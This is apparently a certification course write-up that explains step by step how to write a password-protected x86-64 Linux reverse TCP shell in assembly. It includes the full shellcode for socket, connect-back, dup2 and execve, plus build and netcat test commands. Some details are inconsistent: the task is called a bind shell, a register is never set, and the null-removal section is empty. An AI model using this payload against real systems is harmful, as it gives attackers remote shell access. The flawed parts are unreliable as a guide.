## Assignment #2: Shell_Reverse_TCP
---
---
### Introduction
---
Requirements for this assignment are to create a Shell_bind_tcp shellcode that: 

- Conects back to a IP and PORT 
- Requires a password 
- If the password is correct, then Exec Shell is executed 
- NULL bytes (0x00) must be removed from the shellcode 

To build the shellcode, linux sockets are required to implement the following steps: 

1. Create a socket 
2. Reverse connect 
3. Ask, read, and validate the password 
4. Duplicate SDTIN, STDOUT and STDERR to the socket 
5. Execute /bin/sh  

As in the previous assignment, the program will exit with a Segmentation Fault if the password is incorrect.

For Linux Sockets Programming, the following System calls are required on this assignment:
```c
int socket(int domain, int type, int protocol); 
connect(sock, (struct sockaddr *)&server, sockaddr_len) 
int close(int sockfd); 
```
To duplicate the standard input, output and error, `dup2()` call will be used:

```c
int dup2(int oldfd, int newfd); 
```
And to execute /bin/sh, will use the execve() call:
```c
int execve(const char *filename, 
           char *const argv[], 
           char *const envp[]);
```
### ASM Implementation
---

Will explain how we implement each step mentioned before into ASM, with the idea to make the code easy to understand. As in the previous assignment, no enphasys has been put into removing NULLs and make the shellcode small (this is done later), to make the implementation clear. This time, implementation will be easier than the previous assignment as the number of syscalls is reduced for being a reverse shell.

#### Create Socket
```asm
; sock = socket(AF_INET, SOCK_STREAM, 0) 
mov rax, 41                     ; syscall number 
mov rdi, AF_INET                ; IPv4 
mov rsi, SOCK_STREAM            ; TCP connection 
mov rdx, 0                      ; IP Protocol 
syscall 

; Save the socket_id value in RDI for future use 
mov rdi, rax                    ; value returned in RAX by syscall 
```
Opens the socket. To execute the sys_socket system call the arguments will have to be placed in the corresponding registers: 

  - RAX <- 41 : Syscall number. 
  - RDI <- 2 : Domain parameter. AF_INET is for IPv4. 
  - RSI <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
  - RDX <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 

The syscall will return a file descriptor in RAX that is saved into RDI. This saves the socket_id for later use in the code.

#### Connect Back
The following call is the one being to be used: 
```c
int  connect(int  sockfd, const struct sockaddr *serv_addr, socklen_t addrlen); 
```
For this assignment, registers will get the following values: 

- RDI : The sock_id from the open() call 
- RSI : Addres of the sockaddr struct 
- RDX : Length of the struct 

First is to build the struct with the required data. This is doing using the stack in the following code: 

```asm
; Prepare the struct for connect 
;     server.sin_family = AF_INET 
;     server.sin_port = htons(PORT) 
;     server.sin_addr.s_addr = inet_addr("127.0.0.1") 
;     bzero(&server.sin_zero, 8) 

xor rax, rax 
push rax                                ; bzero 

mov dword [rsp-4], 0x0100007f           ; Inet addr == 127.0.0.1 
mov word [rsp-6], 0x5c11                ; Port 4444 
mov word [rsp-8], 0x2                   ; TCP Connection 
sub rsp, 8                              ; Update RSP value 
```
The legth of this struct is a total of 16 bytes, and the address to the struct is in RSP. 

Next step is do the call to `connect()`, placing RSP into RSI, RDI already will have the socket_id fro before, and RDX the value "16" that's the length of the struct: 
```asm
; connect(sock, (struct sockaddr *)&server, sockaddr_len) 

mov rax, 42                             ; Syscall number for connect() 
mov rsi, rsp                            ; & struct 
mov rdx, 16                             ; Struct length 
syscall 
```
#### Duplicate to Socket Descriptor
Now is time to duplicate `stdin`, `stdout` and `stderr` to the sock_id. This is done in the following code, pretty much the same as the previous assignment: 
```asm
        ; duplicate sockets 
        ; dup2 (new, old) 

        mov rax, 33 
        mov rsi, 0 
        syscall 

        mov rax, 33 
        mov rsi, 1 
        syscall 

        mov rax, 33 
        mov rsi, 2 
        syscall 
 ```
#### Password Stuff
The code for the password stuff is the same as in the Assignment #1. A `“Passwd: “` prompt is shown and a password max of 8 characters is received from the user input. This input is compared to the hardcoded password and if equals the program continues, else, the program exits with a Segmentation Fault.
```asm
write_syscall: 

        mov rax, 1                              ; Syscall number for write() 
        mov rdi, r9 
        lea rsi, [rel PASSWD_PROMPT]            ; Rel addressing to prompt 
        mov rdx, 8                              ; Length of PAsswd: string 
        syscall 

read_syscall: 

        xor rax, rax                            ; Syscall number for read() 
        mov rdi, r9 
        mov rsi, [rel PASSWD_INPUT]             ; Where to store the input passwd 
        mov rdx, 8                              ; Chars to read 
        syscall 

compare_passwords: 

        mov rax, "12345678"                     ; Thgis is the password 
        lea rdi, [rel PASSWD_INPUT]             ; Compare the QWord 
        scasq 
        jne exit_program                        ; Passwords don't match, exit 
```
#### The Shell with Execve

Last step is to execute `/bin/sh`. Stack Technique is used to store the string `/bin//sh` and the length of the string: 
```asm
execve_syscall: 

        ; First NULL push 
        xor rax, rax 
        push rax 

        ; push /bin//sh in reverse 
        mov rbx, 0x68732f2f6e69622f 
        push rbx 

        ; store /bin//sh address in RDI 
        mov rdi, rsp 

        ; Second NULL push 
        push rax 

        ; set RDX 
        mov rdx, rsp 

        ; Push address of /bin//sh 
        push rdi 

        ; set RSI 
        mov rsi, rsp 

        ; Call the Execve syscall 
        add rax, 59 
        syscall 
```

#### Putting All Together

The code for this first version of the Reverse Shell, can be found in the [ReverseShell-ExecveStack](https://github.com/galminyana/SLAE64/Assignment02/ReverseShell-ExecveStack.nasm) on the [GitHub Repo](https://github.com/galminyana/SLAE64/).

Let's try the code compiling and linking it. Commands are:

```markdown
SLAE64> nasm -f elf64 ReverseShell-ExecveStack.nasm -o ReverseShell-ExecveStack.o
SLAE64> ld -N ReverseShell-ExecveStack.o -o ReverseShell-ExecveStack
```
<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Compile.png" width="75%" height="75%">

> The **-N** option in the linker is needed, as the code access to memory positions in the `.text` section (code) instead `.data` section.

To test, a `netcat` listener needs to be opened. Now the program can be run, and in the `netcat` listener will get the "Passwd: " prompt:

<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Exec01.png" width="75%" height="75%">

Like in the previous assignment, if the password is correct, the program continues. If password is incorrect, the program ends with a Segmentation Fault.

### Remove NULLs and Reduce Shellcode Size
---

















### The End

This pages have been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html

Student ID: PA-14628
 
